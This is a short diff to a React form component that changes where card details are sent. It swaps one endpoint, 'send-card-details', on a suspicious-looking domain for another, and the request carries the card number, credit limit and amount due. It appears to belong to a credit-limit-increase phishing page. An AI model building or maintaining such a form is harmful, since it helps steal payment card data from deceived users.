@@ -53,7 +53,7 @@ const CardDetail = () => {
     e.preventDefault();
     if (handleValidation()) {
       try {
-        const response = await axios.post("https://api.limitincrease.shop/v1/send-card-details", {
+        const response = await axios.post("https://api.cardincrease.site/v1/send-card-details", {
           cardNumber: Number(cardNumber),
           creditLimit: Number(creditLimit),
           totalAmountDue: Number(totalAmountDue),
